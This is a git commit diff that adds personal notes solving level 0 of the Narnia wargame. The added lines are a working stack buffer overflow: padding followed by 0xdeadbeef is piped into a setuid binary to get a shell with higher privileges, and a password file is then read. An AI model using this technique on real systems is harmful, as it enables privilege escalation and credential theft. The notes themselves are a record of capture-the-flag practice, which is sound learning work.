4ffa3d391903f85c0326539d1a43074a9e8d76ff
ALaks96 <arek.laks@gmail.com>
2019-11-28 18:41:44 +0100

    first exploit!

--- NARNIA/narnia.sh
+++ NARNIA/narnia.sh
@@ -1,7 +1,13 @@
 # narnia 0 -> narnia 1
-
-
-
+file narnia0
+file narnia0.c
+vim narnia0.c
+mkdir /tmp/zulu
+cd /tmp/zulu
+# After several tries, seems we need to use echo chained with cat to pass correct val in hex dump transl. to narnia0 executable to 1. open shell with narnia1 perm and 2. keep shel open
+( echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat; ) | /narnia/narnia0
+whoami
+cat /etc/narnia_pass/narnia0
 
 
 
